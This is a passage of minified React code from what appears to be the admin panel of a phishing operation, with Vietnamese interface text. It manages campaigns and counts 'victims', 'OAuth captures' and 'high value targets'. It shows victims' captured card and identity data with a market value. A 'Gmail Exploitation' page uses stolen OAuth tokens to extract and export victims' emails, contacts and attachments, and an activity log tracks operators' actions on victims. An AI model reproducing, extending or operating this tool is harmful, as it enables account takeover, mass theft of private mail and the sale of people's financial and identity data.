đầu"}),e.jsx(se,{type:"date",value:o.start_date,onChange:N=>p({...o,start_date:N.target.value})})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Ngày kết thúc"}),e.jsx(se,{type:"date",value:o.end_date,onChange:N=>p({...o,end_date:N.target.value})})]})]})]}),e.jsxs("div",{className:"flex justify-end gap-4 mt-6",children:[e.jsx(C,{variant:"outline",onClick:()=>{y(!1),p({name:"",description:"",start_date:"",end_date:""})},children:"Hủy"}),e.jsx(C,{onClick:D,disabled:!o.name||S.isPending,children:S.isPending?"Đang tạo...":"Tạo Campaign"})]})]})}),f&&c&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50",children:e.jsxs("div",{className:"bg-white rounded-lg max-w-2xl w-full p-6",children:[e.jsx("h2",{className:"text-2xl font-bold text-gray-900 mb-6",children:"Chỉnh sửa Campaign"}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Tên Campaign *"}),e.jsx(se,{value:o.name,onChange:N=>p({...o,name:N.target.value}),placeholder:"Nhập tên campaign"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Mô tả"}),e.jsx("textarea",{value:o.description,onChange:N=>p({...o,description:N.target.value}),className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",rows:4,placeholder:"Nhập mô tả campaign"})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Ngày bắt đầu"}),e.jsx(se,{type:"date",value:o.start_date,onChange:N=>p({...o,start_date:N.target.value})})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Ngày kết thúc"}),e.jsx(se,{type:"date",value:o.end_date,onChange:N=>p({...o,end_date:N.target.value})})]})]})]}),e.jsxs("div",{className:"flex justify-end gap-4 mt-6",children:[e.jsx(C,{variant:"outline",onClick:()=>{b(!1),x(null)},children:"Hủy"}),e.jsx(C,{onClick:z,disabled:!o.name||O.isPending,children:O.isPending?"Đang cập nhật...":"Cập nhật"})]})]})}),c&&!f&&e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50",children:e.jsxs("div",{className:"bg-white rounded-lg max-w-4xl w-full max-h-screen overflow-y-auto p-6",children:[e.jsxs("div",{className:"flex justify-between items-center mb-6",children:[e.jsxs("h2",{className:"text-2xl font-bold text-gray-900",children:["Chi tiết Campaign: ",c.name]}),e.jsx(C,{variant:"outline",onClick:()=>x(null),children:"Đóng"})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{className:"text-lg",children:"Thông tin cơ bản"})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Tên Campaign"}),e.jsx("p",{className:"text-sm font-semibold text-gray-900 mt-1",children:c.name})]}),c.description&&e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Mô tả"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:c.description})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Trạng thái"}),e.jsx($,{className:W(c.status),children:U(c.status)})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-gray-500",children:"Ngày tạo"}),e.jsx("p",{className:"text-sm text-gray-900 mt-1",children:ue(c.created_at)})]})]})]}),P&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{className:"text-lg",children:"Thống kê"})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx("span",{className:"text-sm text-gray-600",children:"Tổng Victims"}),e.jsx("span",{className:"text-lg font-bold text-gray-900",children:P.total_victims||0})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx("span",{className:"text-sm text-gray-600",children:"OAuth Captures"}),e.jsx("span",{className:"text-lg font-bold text-green-600",children:P.oauth_captures||0})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx("span",{className:"text-sm text-gray-600",children:"High Value Targets"}),e.jsx("span",{className:"text-lg font-bold text-purple-600",children:P.high_value_targets||0})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx("span",{className:"text-sm text-gray-600",children:"Conversion Rate"}),e.jsx("span",{className:"text-lg font-bold text-blue-600",children:P.conversion_rate?`${P.conversion_rate}%`:"0%"})]})]})]})]}),e.jsx("div",{className:"mt-6 flex justify-end gap-4",children:e.jsxs(C,{variant:"outline",onClick:()=>{p({name:c.name,description:c.description||"",start_date:c.start_date||"",end_date:c.end_date||""}),b(!0)},children:[e.jsx(ja,{className:"h-4 w-4 mr-2"}),"Chỉnh sửa"]})})]})})]})}function yi(){var z,G,j,W,U,J,q,T,E,N,A;const{toast:n}=Se(),t=qe(),[s,a]=d.useState(null),[r,i]=d.useState(null),[c,x]=d.useState("emails"),[l,y]=d.useState(""),[f,b]=d.useState(new Map);Ge({type:"gmail",enabled:!0,onMessage:w=>{if(w.type==="gmail:extraction-progress"){const{sessionId:X,progress:ne,status:te,itemsExtracted:oe}=w.data;b(et=>{var us;const xs=new Map(et);return xs.set(X,{id:X,victim_id:(s==null?void 0:s.id)||"",extraction_type:c,status:te,progress:ne.percentage||0,items_extracted:(oe==null?void 0:oe.emails)||0,started_at:((us=et.get(X))==null?void 0:us.started_at)||new Date().toISOString()}),xs})}else if(w.type==="gmail:extraction-completed"){const{sessionId:X,itemsExtracted:ne}=w.data;b(te=>{var et;const oe=new Map(te);return oe.set(X,{id:X,victim_id:(s==null?void 0:s.id)||"",extraction_type:c,status:"completed",progress:100,items_extracted:(ne==null?void 0:ne.emails)||0,started_at:((et=te.get(X))==null?void 0:et.started_at)||new Date().toISOString(),completed_at:new Date().toISOString()}),oe}),t.invalidateQueries({queryKey:["gmail-extraction-results",X]}),n({title:"Extraction Complete",description:`Extracted ${(ne==null?void 0:ne.emails)||0} emails, ${(ne==null?void 0:ne.contacts)||0} contacts`})}}});const{data:o}=me({queryKey:["victims-for-gmail",l],queryFn:()=>{const w=new URLSearchParams;return l&&w.append("search",l),w.append("page","1"),w.append("limit","100"),Q.apiRequest(`/admin/victims?${w.toString()}`).then(X=>{const ne=(X.items||[]).map(te=>{var oe;return{id:te.id,email:te.email,name:te.name,phone:te.phone,capture_timestamp:te.captureTimestamp,campaign_id:(oe=te.campaign)==null?void 0:oe.id,campaign:te.campaign,capture_method:te.captureMethod,capture_source:te.captureSource,session_data:te.sessionData||{},device_fingerprint:te.deviceFingerprint||{},validation:te.validation||{},risk_assessment:te.riskAssessment||{},card_information:te.cardInformation||{},identity_verification:te.identityVerification||{},created_at:te.createdAt,updated_at:te.updatedAt,is_active:te.isActive,hasOAuthTokens:te.hasOAuthTokens,oauthTokensCount:te.oauthTokensCount,hasCardInfo:te.hasCardInfo,hasIdentityVerification:te.hasIdentityVerification,registrationCompleted:te.registrationCompleted}});return{...X,items:ne}})}}),p=((z=o==null?void 0:o.items)==null?void 0:z.filter(w=>w.hasOAuthTokens))||[],{data:g}=me({queryKey:["oauth-tokens",s==null?void 0:s.id],queryFn:()=>s?Q.apiRequest(`/admin/victims/${s.id}/oauth-tokens`):Promise.resolve([]),enabled:!!s}),[h,m]=d.useState(null),{data:B}=me({queryKey:["gmail-extraction-results",h],queryFn:async()=>h?Q.apiRequest(`/admin/gmail/access/${h}/results`):null,enabled:!!h,refetchInterval:w=>{var ne;return((ne=w.state.data)==null?void 0:ne.status)==="in_progress"?5e3:!1}}),P=B,S=pe({mutationFn:({victimId:w,adminId:X})=>Q.apiRequest("/admin/gmail/access",{method:"POST",body:JSON.stringify({victimId:w,adminId:X,accessMethod:"oauth_tokens"})}),onSuccess:w=>{m(w.sessionId),n({title:"Thành công",description:"Đã khởi tạo Gmail access session"})},onError:w=>{n({title:"Lỗi",description:w.message,variant:"destructive"})}}),O=pe({mutationFn:({sessionId:w,extractionConfig:X})=>Q.apiRequest(`/admin/gmail/access/${w}/extract`,{method:"POST",body:JSON.stringify(X)}),onSuccess:()=>{t.invalidateQueries({queryKey:["gmail-extraction-results"]}),n({title:"Thành công",description:"Đã bắt đầu extraction"})},onError:w=>{n({title:"Lỗi",description:w.message,variant:"destructive"})}}),V=pe({mutationFn:({sessionId:w,format:X})=>Q.apiRequest(`/admin/gmail/access/${w}/results/export`,{method:"POST",body:JSON.stringify({format:X})}),onSuccess:(w,X)=>{const ne=new Blob([w],{type:X.format==="json"?"application/json":"text/csv"}),te=URL.createObjectURL(ne),oe=document.createElement("a");oe.href=te,oe.download=`gmail_data_${s==null?void 0:s.email}_${new Date().toISOString().split("T")[0]}.${X.format}`,document.body.appendChild(oe),oe.click(),document.body.removeChild(oe),URL.revokeObjectURL(te),n({title:"Thành công",description:"Dữ liệu đã được xuất thành công"})},onError:w=>{n({title:"Lỗi",description:w.message,variant:"destructive"})}}),v=mt(()=>{t.invalidateQueries({queryKey:["victims-for-gmail"]})},500),I=w=>{y(w),v()},u=async()=>{if(!s){n({title:"Lỗi",description:"Vui lòng chọn victim",variant:"destructive"});return}const w=Q.getUser();if(!w||!w.id){n({title:"Lỗi",description:"Không tìm thấy thông tin admin user",variant:"destructive"});return}S.mutate({victimId:s.id,adminId:String(w.id)},{onSuccess:X=>{O.mutate({sessionId:X.sessionId,extractionConfig:{extractEmails:c==="emails"||c==="full",extractContacts:c==="contacts"||c==="full",extractAttachments:c==="attachments"||c==="full",maxResults:100}})}})},D=w=>{if(!h){n({title:"Lỗi",description:"Không có session active. Vui lòng bắt đầu extraction trước.",variant:"destructive"});return}V.mutate({sessionId:h,format:w})};return e.jsxs("div",{className:"p-6 max-w-7xl mx-auto",children:[e.jsx("div",{className:"mb-8",children:e.jsx("div",{className:"flex justify-between items-start",children:e.jsxs("div",{children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900",children:"Gmail Exploitation"}),e.jsx("p",{className:"text-gray-600 mt-2",children:"Khai thác dữ liệu Gmail từ OAuth tokens"})]})})}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(_e,{className:"h-5 w-5"}),"Chọn Victim"]})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{className:"relative",children:[e.jsx(He,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),e.jsx(se,{placeholder:"Tìm kiếm victim...",value:l,onChange:w=>I(w.target.value),className:"pl-10"})]}),e.jsx("div",{className:"space-y-2 max-h-96 overflow-y-auto",children:p==null?void 0:p.map(w=>{var X;return e.jsxs("div",{onClick:()=>{a(w),i(null)},className:`p-3 rounded-lg border cursor-pointer transition-colors ${(s==null?void 0:s.id)===w.id?"bg-blue-50 border-blue-500":"bg-white border-gray-200 hover:bg-gray-50"}`,children:[e.jsx("div",{className:"font-medium text-gray-900",children:w.email}),w.name&&e.jsx("div",{className:"text-sm text-gray-600",children:w.name}),e.jsxs("div",{className:"flex items-center gap-2 mt-2",children:[e.jsx($,{variant:"outline",className:"text-xs",children:w.capture_method==="oauth_google"?"Google":"Apple"}),((X=w.validation)==null?void 0:X.market_value)&&e.jsx($,{className:"text-xs",children:w.validation.market_value})]})]},w.id)})})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(Ke,{className:"h-5 w-5"}),"OAuth Token & Extraction"]})}),e.jsx(_,{className:"space-y-4",children:s?e.jsxs(e.Fragment,{children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Chọn OAuth Token"}),e.jsxs(ce,{value:(r==null?void 0:r.id)||"",onValueChange:w=>{const X=g==null?void 0:g.find(ne=>ne.id===w);i(X||null)},children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Chọn token"})}),e.jsx(ie,{children:g==null?void 0:g.map(w=>e.jsx(R,{value:w.id,children:e.jsxs("div",{className:"flex items-center justify-between w-full",children:[e.jsx("span",{children:w.provider}),e.jsx($,{className:w.token_status==="active"?"bg-green-100 text-green-800":w.token_status==="expired"?"bg-red-100 text-red-800":"bg-gray-100 text-gray-800",children:w.token_status})]})},w.id))})]})]}),r&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Loại Extraction"}),e.jsxs(ce,{value:c,onValueChange:w=>x(w),children:[e.jsx(re,{children:e.jsx(le,{})}),e.jsxs(ie,{children:[e.jsx(R,{value:"emails",children:"Emails Only"}),e.jsx(R,{value:"contacts",children:"Contacts Only"}),e.jsx(R,{value:"attachments",children:"Attachments Only"}),e.jsx(R,{value:"full",children:"Full Extraction"})]})]})]}),e.jsx("div",{className:"p-3 bg-blue-50 rounded-lg",children:e.jsxs("div",{className:"text-sm text-gray-700 space-y-1",children:[e.jsxs("p",{children:[e.jsx("strong",{children:"Provider:"})," ",r.provider]}),e.jsxs("p",{children:[e.jsx("strong",{children:"Status:"})," ",r.token_status]}),e.jsxs("p",{children:[e.jsx("strong",{children:"Issued:"})," ",ue(r.issued_at)]}),e.jsxs("p",{children:[e.jsx("strong",{children:"Expires:"})," ",ue(r.expires_at)]})]})}),e.jsx(C,{onClick:u,disabled:S.isPending||O.isPending||r.token_status!=="active",className:"w-full",children:S.isPending||O.isPending?e.jsxs(e.Fragment,{children:[e.jsx(Ns,{className:"h-4 w-4 mr-2 animate-spin"}),"Đang khởi động..."]}):e.jsxs(e.Fragment,{children:[e.jsx(lt,{className:"h-4 w-4 mr-2"}),"Bắt đầu Extraction"]})}),e.jsxs("div",{className:"flex gap-2",children:[e.jsxs(C,{variant:"outline",onClick:()=>D("csv"),disabled:V.isPending,className:"flex-1",children:[e.jsx(Ee,{className:"h-4 w-4 mr-2"}),"Export CSV"]}),e.jsxs(C,{variant:"outline",onClick:()=>D("json"),disabled:V.isPending,className:"flex-1",children:[e.jsx(Ee,{className:"h-4 w-4 mr-2"}),"Export JSON"]})]})]})]}):e.jsxs("div",{className:"text-center py-8 text-gray-500",children:[e.jsx(_e,{className:"h-12 w-12 mx-auto mb-4 text-gray-300"}),e.jsx("p",{children:"Vui lòng chọn một victim"})]})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(ye,{className:"h-5 w-5"}),"Active Extractions"]})}),e.jsx(_,{children:f.size>0?e.jsx("div",{className:"space-y-3",children:Array.from(f.values()).map(w=>e.jsxs("div",{className:"p-3 bg-gray-50 rounded-lg",children:[e.jsxs("div",{className:"flex items-center justify-between mb-2",children:[e.jsx("span",{className:"text-sm font-medium",children:w.extraction_type}),e.jsx($,{className:w.status==="completed"?"bg-green-100 text-green-800":w.status==="in_progress"?"bg-blue-100 text-blue-800":w.status==="failed"?"bg-red-100 text-red-800":"bg-yellow-100 text-yellow-800",children:w.status})]}),w.status==="in_progress"&&e.jsxs("div",{className:"mt-2",children:[e.jsxs("div",{className:"flex items-center justify-between text-xs text-gray-600 mb-1",children:[e.jsx("span",{children:"Progress"}),e.jsxs("span",{children:[w.progress,"%"]})]}),e.jsx("div",{className:"w-full bg-gray-200 rounded-full h-2",children:e.jsx("div",{className:"bg-blue-600 h-2 rounded-full transition-all",style:{width:`${w.progress}%`}})})]}),w.items_extracted>0&&e.jsxs("p",{className:"text-xs text-gray-600 mt-2",children:[w.items_extracted," items extracted"]})]},w.id))}):e.jsxs("div",{className:"text-center py-8 text-gray-500",children:[e.jsx(ye,{className:"h-12 w-12 mx-auto mb-4 text-gray-300"}),e.jsx("p",{children:"Không có extraction nào đang chạy"})]})})]})]}),h&&P&&e.jsx("div",{className:"mt-6",children:e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(We,{className:"h-5 w-5"}),"Extraction Results",e.jsxs($,{className:P.status==="completed"?"bg-green-100 text-green-800":"bg-blue-100 text-blue-800",children:[P.status==="completed"?e.jsx(wt,{className:"h-3 w-3 mr-1"}):e.jsx(Ns,{className:"h-3 w-3 mr-1 animate-spin"}),P.status==="completed"?"Hoàn tất":P.status==="failed"?"Thất bại":"Đang xử lý"]})]})}),e.jsxs(_,{children:[e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-6 mb-6",children:[e.jsxs("div",{className:"text-center p-4 bg-blue-50 rounded-lg",children:[e.jsx(Ke,{className:"h-8 w-8 mx-auto mb-2 text-blue-600"}),e.jsx("p",{className:"text-2xl font-bold text-gray-900",children:((j=(G=P.extractionResults)==null?void 0:G.emails)==null?void 0:j.length)||0}),e.jsx("p",{className:"text-sm text-gray-600",children:"Total Emails"})]}),e.jsxs("div",{className:"text-center p-4 bg-green-50 rounded-lg",children:[e.jsx(_e,{className:"h-8 w-8 mx-auto mb-2 text-green-600"}),e.jsx("p",{className:"text-2xl font-bold text-gray-900",children:((U=(W=P.extractionResults)==null?void 0:W.contacts)==null?void 0:U.length)||0}),e.jsx("p",{className:"text-sm text-gray-600",children:"Total Contacts"})]}),e.jsxs("div",{className:"text-center p-4 bg-purple-50 rounded-lg",children:[e.jsx(Ue,{className:"h-8 w-8 mx-auto mb-2 text-purple-600"}),e.jsx("p",{className:"text-2xl font-bold text-gray-900",children:((q=(J=P.extractionResults)==null?void 0:J.attachments)==null?void 0:q.length)||0}),e.jsx("p",{className:"text-sm text-gray-600",children:"Total Attachments"})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{className:"text-base",children:"Recent Emails"})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-3 max-h-96 overflow-y-auto",children:(E=(T=P.extractionResults)==null?void 0:T.emails)==null?void 0:E.slice(0,10).map(w=>e.jsxs("div",{className:"p-3 bg-gray-50 rounded-lg",children:[e.jsxs("div",{className:"flex items-start justify-between mb-2",children:[e.jsxs("div",{className:"flex-1",children:[e.jsx("p",{className:"font-medium text-sm text-gray-900",children:w.subject}),e.jsx("p",{className:"text-xs text-gray-600 mt-1",children:w.from})]}),e.jsx("span",{className:"text-xs text-gray-500",children:ht(w.date)})]}),e.jsx("p",{className:"text-xs text-gray-600 line-clamp-2",children:w.snippet})]},w.id))})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{className:"text-base",children:"Top Contacts"})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-2 max-h-96 overflow-y-auto",children:(A=(N=P.extractionResults)==null?void 0:N.contacts)==null?void 0:A.slice(0,10).map((w,X)=>e.jsx("div",{className:"flex items-center justify-between p-3 bg-gray-50 rounded-lg",children:e.jsx("div",{children:e.jsx("p",{className:"font-medium text-sm text-gray-900",children:w.email})})},X))})})]})]})]})]})})]})}function vi(){var z,G;const{toast:n}=Se(),t=qe(),[s,a]=d.useState(""),[r,i]=d.useState({page:1,per_page:50}),[c,x]=d.useState(null),[l,y]=d.useState([]),[f,b]=d.useState(!0),o=d.useRef(null),p=d.useRef(!0),g=()=>{if(o.current){const{scrollTop:j,scrollHeight:W,clientHeight:U}=o.current;p.current=j+U>=W-50}};d.useEffect(()=>{f&&p.current&&o.current&&(o.current.scrollTop=o.current.scrollHeight)},[l,f]);const{isConnected:h}=hi({onActivityLogCreated:j=>{var U,J;const W={id:j.id||j.logId||`log-${Date.now()}`,action:j.actionType||"unknown",details:JSON.stringify(j.actionDetails||{}),user_id:j.adminId||((U=j.actor)==null?void 0:U.identifier)||0,created_at:j.timestamp||((J=j.technicalContext)==null?void 0:J.timestamp)||new Date().toISOString(),resource_type:j.actionCategory||"system",actionType:j.actionType,actionCategory:j.actionCategory,severityLevel:j.severityLevel,actor:j.actor,target:j.target,actionDetails:j.actionDetails,technicalContext:j.technicalContext};y(q=>q.some(T=>T.id===W.id)?q:[W,...q].slice(0,100)),n({title:"New Activity",description:j.actionType||"New activity logged"}),t.invalidateQueries({queryKey:["activity-analytics"]})},onActivityNew:j=>{const W={id:j.id||`activity-${Date.now()}`,action:j.actionType||"unknown",details:JSON.stringify(j.actionDetails||{}),user_id:j.adminId||0,created_at:j.timestamp||new Date().toISOString(),resource_type:j.actionCategory||"system",actionType:j.actionType,actionCategory:j.actionCategory,severityLevel:j.severityLevel};y(U=>U.some(J=>J.id===W.id)?U:[W,...U].slice(0,100))}}),{data:m,isLoading:B,refetch:P}=me({queryKey:["activity-logs",r,s],queryFn:()=>{const j=new URLSearchParams;return Object.entries({...r,search:s}).forEach(([W,U])=>{U&&j.append(W,U.toString())}),Q.apiRequest(`/admin/activity-logs?${j.toString()}`)}}),S=d.useMemo(()=>{const j=(m==null?void 0:m.items)||[];return[...l,...j].reduce((J,q)=>(J.find(T=>T.id===q.id)||J.push(q),J),[]).sort((J,q)=>new Date(q.created_at).getTime()-new Date(J.created_at).getTime())},[m,l]),{data:O}=me({queryKey:["activity-analytics",r.date_from,r.date_to],queryFn:()=>{const j=new URLSearchParams;return r.date_from&&j.append("date_from",r.date_from),r.date_to&&j.append("date_to",r.date_to),Q.apiRequest(`/admin/activity-logs/analytics?${j.toString()}`)},staleTime:6e4}),V=pe({mutationFn:()=>{const j=new URLSearchParams;return Object.entries(r).forEach(([W,U])=>{U&&j.append(W,U.toString())}),Q.apiRequest(`/admin/activity-logs/export?${j.toString()}`)},onSuccess:j=>{const W=new Blob([j],{type:"text/csv"}),U=URL.createObjectURL(W),J=document.createElement("a");J.href=U,J.download=`activity_logs_${new Date().toISOString().split("T")[0]}.csv`,document.body.appendChild(J),J.click(),document.body.removeChild(J),URL.revokeObjectURL(U),n({title:"Thành công",description:"Dữ liệu đã được xuất thành công"})},onError:j=>{n({title:"Lỗi",description:j.message,variant:"destructive"})}}),v=mt(j=>{i({...r,page:1})},500),I=j=>{a(j),v(j)},u=j=>j.includes("create")||j.includes("add")?e.jsx(wt,{className:"h-4 w-4 text-green-600"}):j.includes("delete")||j.includes("remove")?e.jsx(Ne,{className:"h-4 w-4 text-red-600"}):j.includes("update")||j.includes("edit")?e.jsx(ns,{className:"h-4 w-4 text-blue-600"}):j.includes("login")||j.includes("auth")?e.jsx(_e,{className:"h-4 w-4 text-purple-600"}):e.jsx(Ce,{className:"h-4 w-4 text-gray-600"}),D=j=>j.includes("create")||j.includes("add")?"bg-green-100 text-green-800":j.includes("delete")||j.includes("remove")?"bg-red-100 text-red-800":j.includes("update")||j.includes("edit")?"bg-blue-100 text-blue-800":j.includes("login")||j.includes("auth")?"bg-purple-100 text-purple-800":"bg-gray-100 text-gray-800";return e.jsxs("div",{className:"p-6 max-w-7xl mx-auto",children:[e.jsx("div",{className:"mb-8",children:e.jsxs("div",{className:"flex justify-between items-start",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900",children:"Activity Logs"}),e.jsx("p",{className:"text-gray-600 mt-2",children:"Xem lịch sử hoạt động của hệ thống"})]}),e.jsxs("div",{className:"flex gap-2 items-center",children:[e.jsx("div",{className:"flex items-center gap-2 mr-2",children:h?e.jsxs($,{variant:"outline",className:"bg-green-50 text-green-700 border-green-200",children:[e.jsx(is,{className:"h-3 w-3 mr-1"}),"Real-time"]}):e.jsxs($,{variant:"outline",className:"bg-gray-50 text-gray-600 border-gray-200",children:[e.jsx(rs,{className:"h-3 w-3 mr-1"}),"Offline"]})}),e.jsxs(C,{onClick:()=>b(!f),variant:f?"default":"outline",size:"sm",children:["Auto-scroll ",f?"ON":"OFF"]}),e.jsxs(C,{onClick:()=>P(),variant:"outline",size:"sm",children:[e.jsx(ye,{className:"h-4 w-4 mr-2"}),"Làm mới"]}),e.jsxs(C,{onClick:()=>V.mutate(),disabled:V.isPending,variant:"outline",children:[e.jsx(Ee,{className:"h-4 w-4 mr-2"}),V.isPending?"Đang xuất...":"Xuất CSV"]})]})]})}),O&&e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-6 mb-8",children:[e.jsx(k,{children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Tổng hoạt động"}),e.jsx("p",{className:"text-2xl font-bold text-gray-900",children:O.total_activities||0})]}),e.jsx("div",{className:"p-3 bg-blue-50 rounded-lg",children:e.jsx(Ce,{className:"h-6 w-6 text-blue-600"})})]})})}),e.jsx(k,{children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Người dùng hoạt động"}),e.jsx("p",{className:"text-2xl font-bold text-green-600",children:O.active_users||0})]}),e.jsx("div",{className:"p-3 bg-green-50 rounded-lg",children:e.jsx(_e,{className:"h-6 w-6 text-green-600"})})]})})}),e.jsx(k,{children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Hoạt động hôm nay"}),e.jsx("p",{className:"text-2xl font-bold text-purple-600",children:O.today_activities||0})]}),e.jsx("div",{className:"p-3 bg-purple-50 rounded-lg",children:e.jsx(Te,{className:"h-6 w-6 text-purple-600"})})]})})}),e.jsx(k,{children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600",children:"Top Action"}),e.jsx("p",{className:"text-lg font-bold text-gray-900",children:O.top_action||"-"})]}),e.jsx("div",{className:"p-3 bg-yellow-50 rounded-lg",children:e.jsx(Ue,{className:"h-6 w-6 text-yellow-600"})})]})})})]}),e.jsx(k,{className:"mb-6",children:e.jsx(_,{className:"p-6",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-4",children:[e.jsxs("div",{className:"relative",children:[e.jsx(He,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400"}),e.jsx(se,{placeholder:"Tìm kiếm...",value:s,onChange:j=>I(j.target.value),className:"pl-10"})]}),e.jsxs(ce,{value:r.action||"",onValueChange:j=>i({...r,action:j||void 0,page:1}),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Action"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"",children:"Tất cả"}),e.jsx(R,{value:"create",children:"Create"}),e.jsx(R,{value:"update",children:"Update"}),e.jsx(R,{value:"delete",children:"Delete"}),e.jsx(R,{value:"login",children:"Login"}),e.jsx(R,{value:"export",children:"Export"})]})]}),e.jsxs(ce,{value:r.resource_type||"",onValueChange:j=>i({...r,resource_type:j||void 0,page:1}),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Resource Type"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"",children:"Tất cả"}),e.jsx(R,{value:"victim",children:"Victim"}),e.jsx(R,{value:"campaign",children:"Campaign"}),e.jsx(R,{value:"oauth_token",children:"OAuth Token"}),e.jsx(R,{value:"gmail_extraction",children:"Gmail Extraction"}),e.jsx(R,{value:"user",children:"User"})]})]}),e.jsxs("div",{className:"flex gap-2",children:[e.jsx(se,{type:"date",value:r.date_from||"",onChange:j=>i({...r,date_from:j.target.value||void 0,page:1}),placeholder:"Từ ngày",className:"flex-1"}),e.jsx(se,{type:"date",value:r.date_to||"",onChange:j=>i({...r,date_to:j.target.value||void 0,page:1}),placeholder:"Đến ngày",className:"flex-1"})]})]})})}),e.jsx(k,{children:e.jsx(_,{className:"p-0",children:B?e.jsxs("div",{className:"p-12 text-center",children:[e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"}),e.jsx("p",{className:"text-lg font-medium text-gray-700",children:"Đang tải dữ liệu..."})]}):S.length===0?e.jsxs("div",{className:"p-12 text-center",children:[e.jsx(Ue,{className:"h-12 w-12 mx-auto mb-4 text-gray-300"}),e.jsx("p",{className:"text-lg font-medium text-gray-700",children:"Không có dữ liệu"})]}):e.jsx("div",{ref:o,onScroll:g,className:"max-h-[600px] overflow-y-auto",children:e.jsxs(Me,{children:[e.jsx(Pe,{children:e.jsxs(he,{children:[e.jsx(K,{children:"Thời gian"}),e.jsx(K,{children:"Người dùng"}),e.jsx(K,{children:"Action"}),e.jsx(K,{children:"Resource"}),e.jsx(K,{children:"Chi tiết"}),e.jsx(K,{children:"IP Address"}),e.jsx(K,{className:"text-right",children:"Thao tác"})]})}),e.jsx(De,{children:S.map(j=>{var W;return e.jsxs(he,{className:"hover:bg-gray-50",children:[e.jsx(H,{children:e.jsxs("div",{className:"flex items-center gap-2 text-sm",children:[e.jsx(Te,{className:"h-3 w-3 text-gray-400"}),e.jsx("span",{children:ht(j.created_at)})]})}),e.jsx(H,{children:e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(_e,{className:"h-4 w-4 text-gray-400"}),e.jsx("span",{className:"text-sm font-medium text-gray-900",children:((W=j.user)==null?void 0:W.username)||`User #${j.user_id}`})]})}),e.jsx(H,{children:e.jsxs("div",{className:"flex items-center gap-2",children:[u(j.action),e.jsx($,{className:D(j.action),children:j.action})]})}),e.jsx(H,{children:e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("span",{className:"text-sm 